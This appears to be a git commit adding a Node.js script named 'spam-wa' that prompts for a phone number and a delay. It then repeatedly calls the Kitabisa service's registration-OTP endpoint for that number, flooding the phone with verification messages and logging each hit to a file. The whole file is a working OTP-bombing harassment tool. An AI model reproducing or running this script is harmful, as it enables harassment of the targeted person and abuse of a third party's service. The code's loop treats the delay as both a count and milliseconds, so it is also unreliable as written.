ebe4c711e5aacc78a9f72cbc990704461cbf8171
Mr-Bagus <90219490+Mr-Bagus@users.noreply.github.com>
2021-09-17 15:52:00 +0700

    Add files via upload

---
+++ index.js
@@ -0,0 +1,48 @@
+/**
+  * created bagus saputra
+  * name : spam-wa
+  * wa   : 6285832052592
+**/
+
+const request = require('needle')
+const readline= require('readline')
+const fs      = require('fs')
+const colors  = require('colors')
+const dateFormat = require('date-format')
+
+const tanya = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout
+})
+
+var date_ = dateFormat(new Date(), 'm-d-Y h:i:s');
+
+var i = 1
+
+console.log(`\n    [ SPAM OTP wa KITABISA by STech ] \n `)
+console.log(' FB : '+'@'.red+'ibnusyawal00'+' | Git : '+'@'.blue+'ibnusyawall\n')
+
+tanya.question('['+'?'.magenta+'] Nomor : ', (_no_) => {
+  tanya.question('['+'?'.magenta+'] Delay : ', (_de_) => {
+    const main = (nomor, delay) => {
+      setTimeout(() => {
+        request(`https://core.ktbs.io/v2/user/registration/otp/${nomor}`, (error, response, body) => {
+          if (toString(body).match(/errors/gi)) {
+            console.log('['+'×'.red+'] Tunggu Gan .. ')
+          } else {
+            console.log('  -- ['+'v'.green+`] Sukses : ${nomor} [ delay : ${_de_}`+'s '.cyan+`]`)
+            fs.appendFile('./result.txt', `${nomor} : ${date_} \n`, function(err) {
+             if (err) throw err;
+               //console.log(' [v] success saved on result.txt')
+             })
+          }
+        })
+        i++
+        if (i <= delay) {
+          main(nomor, delay)
+        }
+      }, delay)
+    }
+    return main(_no_, `${_de_}000`)
+  })
+})
